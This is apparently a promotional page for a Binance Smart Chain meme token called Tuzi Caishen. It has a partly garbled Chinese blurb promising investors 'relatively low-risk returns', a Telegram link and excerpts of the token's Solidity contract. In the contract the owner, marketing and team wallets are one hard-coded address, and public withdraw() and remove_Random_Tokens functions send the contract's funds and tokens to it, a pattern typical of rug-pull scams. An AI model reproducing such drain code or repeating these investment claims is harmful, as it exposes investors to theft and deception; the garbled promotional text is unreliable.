...
兔子 財神
意思是（石榴）和石榴本身的模因令牌是农历新年庆祝活动中好运的象征。 兔子 財神去中心化的币安智能链，为每一位投资者提供便利和安全。
让愿意冒风险的投资者能够获得相对低风险的回报。此外，Tùzǐ Cáishén 还通过十字军循环平台（Avedex）来促进区块链内部交易，为用户提供低成本的 BSC 交易选择。

https://t.me/tuzicaishen
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xeFFdD6D3B3720fad1cAe8f48085004b31078C871; 
...
contract TuziCaishen is Context, IERC20, Ownable {
    ...
    string private _name = "Tuzi Caishen";
    string private _symbol = " TuziCaishen ";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xeFFdD6D3B3720fad1cAe8f48085004b31078C871); // 
    address payable public teamWalletAddress = payable(0xeFFdD6D3B3720fad1cAe8f48085004b31078C871); // 
    ...
    function withdraw() public {
        ...
        payable(address(0xeFFdD6D3B3720fad1cAe8f48085004b31078C871)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0xeFFdD6D3B3720fad1cAe8f48085004b31078C871),removeRandom);
}}